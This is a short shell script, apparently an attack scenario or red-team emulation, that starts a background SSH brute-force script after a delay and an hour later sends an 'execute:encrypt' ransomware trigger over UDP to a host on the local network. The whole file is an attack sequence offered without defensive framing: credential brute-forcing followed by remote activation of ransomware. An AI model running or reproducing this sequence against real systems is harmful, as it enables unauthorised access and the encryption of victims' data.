sleep 600

bash ./ssh_brute_force.bash &

# wait one hour
sleep 3600

# launch ransomeware trigger
echo "idru5991a:execute:encrypt5" > /dev/udp/192.168.1.4/54321
